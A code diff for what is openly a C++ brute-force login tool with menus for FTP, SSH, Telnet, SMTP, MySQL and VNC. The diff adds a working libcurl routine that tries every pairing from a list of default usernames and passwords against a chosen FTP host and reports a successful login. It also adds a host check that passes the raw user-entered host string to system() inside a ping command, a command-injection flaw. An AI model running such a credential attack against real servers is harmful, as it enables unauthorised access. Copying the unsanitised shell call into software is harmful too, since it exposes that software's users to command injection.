@@ -1,6 +1,7 @@
 #include <iostream>
 #include <unistd.h>
 #include <fstream>
+#include <curl/curl.h>
 
 using namespace std;
 
@@ -55,13 +56,28 @@ dMP      VMMMP" dMP dMP   dMP   dMMMMMP dMP dMP)" <<endl;
     cout<<"__________________________________________________________________\n" << endl << RESET;
 }
 
-bool isHostUp(){
-    
+int isHostUp(const char *ftp_url) {
     cout << CYAN;
-    cout << "[!] Checking the host status.....!" <<endl;
-    // logic code here
+    cout << "[!] Checking the host status.....!" << RESET;
+    cout << endl;
 
-    return true;
+    string command = "ping -c 1 " + string(ftp_url) + " > /dev/null 2>&1";
+    int ihp = system(command.c_str());
+
+    if (ihp == 0) {
+        cout << GREEN;
+        system("sleep 1");
+        cout << "[+] Host is UP" << RESET;
+        cout << endl;
+        system("sleep 1");
+        return 0;
+    } else {
+        cout << RED;
+        cout  << "[-] Host is DOWN" << RESET;
+        cout << endl;
+        exit(1);
+        return -1;
+    }
 }
 
 bool isPortOpen(){
@@ -85,17 +101,56 @@ int ftp(){
         cout << CYAN;
         cout << "[*] starting attack with default credentials " <<endl;
         string host;
-        int port;
         
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
-        cin >> host;        
-        isHostUp();
+        cin >> host;
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
-        cout << YELLOW;
-        cout << "[?] Enter port [20,21] : ";
-        cin >> port;      
-        isPortOpen();
+        string ftp_dflt[] = {"ftp", "root", "toor", "anonymous", "admin", "user"};
+
+        CURL *curl;
+        CURLcode result;
+
+        curl_global_init(CURL_GLOBAL_ALL);
+        curl = curl_easy_init();  // Use curl_easy_init() instead of curl_easy_setopt() for initialization
+
+        if (curl == NULL) {
+            cout << RED;
+            cout << "[!] Failed to initialize curl" << endl;
+        } else {
+            string ftp_url2 = "ftp://" + string(ftp_url);
+            curl_easy_setopt(curl, CURLOPT_URL, ftp_url2.c_str());
+
+    // Loop through default usernames and passwords
+            for (const auto& username : ftp_dflt) {
+                for (const auto& password : ftp_dflt) {
+                    string credentials = username + ":" + password;
+
+                    curl_easy_setopt(curl, CURLOPT_USERPWD, credentials.c_str());  // Set username:password pair
+
+                    result = curl_easy_perform(curl);
+
+                    if (result != CURLE_OK) {
+                        cout << RED;
+                        cout << "[!] Wrong credentials : " << credentials << endl;
+                        cout << curl_easy_strerror(result) <<"\n" <<endl;
+                    } else {
+                        cout << GREEN;
+                        cout << "[+] Successfully logged in 👀 : " << credentials << endl;
+                        break;  // Exit loop on successful authentication
+                    }
+                }
+                if (result == CURLE_OK) {
+                    break;  // Break outer loop if authentication succeeds
+                }
+            }
+            system("sleep 1");
+            cout << YELLOW;
+            cout <<"[!] Ops............😐\nNow try with your wordlist\n" <<endl;
+            system("sleep 1");
+        }
         
         /*
             default credentials checker logic 
@@ -106,23 +161,12 @@ int ftp(){
         cout << CYAN;
         cout << "[*] starting attack with user credentials " <<endl;
         string host;
-        int port;
         
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;
-        
-        cout << CYAN;
-        cout << "[!] Checking the host status.....!" <<endl;
-        isHostUp();
-        
-        cout << YELLOW;
-        cout << "[?] Enter port [20,21] : ";
-        cin >> port;
-        
-        cout << CYAN;
-        cout << "[!] Checking the port is opened or closed.....!" <<endl;
-        isPortOpen();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
     }else{
         
@@ -141,6 +185,8 @@ int ftp(){
         cout << RED;
         cout << "\n[!] Unable to open file.......😪" <<endl;
         system("exit 1");
+    } else {
+        
     }
     
     /*
@@ -167,7 +213,8 @@ int ssh(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;        
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [22,?] : ";
@@ -188,10 +235,8 @@ int ssh(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;
-        
-        cout << CYAN;
-        cout << "[!] Checking the host status.....!" <<endl;
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [22,?] : ";
@@ -244,7 +289,8 @@ int telnet(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;        
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [23,?] : ";
@@ -265,10 +311,9 @@ int telnet(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
-        cout << CYAN;
-        cout << "[!] Checking the host status.....!" <<endl;
-        isHostUp();
         
         cout << YELLOW;
         cout << "[?] Enter port [23,?] : ";
@@ -320,7 +365,8 @@ int smtp(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;        
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [25,?] : ";
@@ -341,10 +387,9 @@ int smtp(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
-        cout << CYAN;
-        cout << "[!] Checking the host status.....!" <<endl;
-        isHostUp();
         
         cout << YELLOW;
         cout << "[?] Enter port [25,?] : ";
@@ -397,7 +442,8 @@ int mysql(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;        
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [3306,?] : ";
@@ -418,10 +464,8 @@ int mysql(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;
-        
-        cout << CYAN;
-        cout << "[!] Checking the host status.....!" <<endl;
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [3306,?] : ";
@@ -474,7 +518,8 @@ int vnc(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;        
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [5900,?] : ";
@@ -495,10 +540,8 @@ int vnc(){
         cout << YELLOW;
         cout << "[?] Enter Host [Ip/domain] : ";
         cin >> host;
-        
-        cout << CYAN;
-        cout << "[!] Checking the host status.....!" <<endl;
-        isHostUp();
+        const char *ftp_url = host.c_str();
+        isHostUp(ftp_url);
         
         cout << YELLOW;
         cout << "[?] Enter port [5900,?] : ";
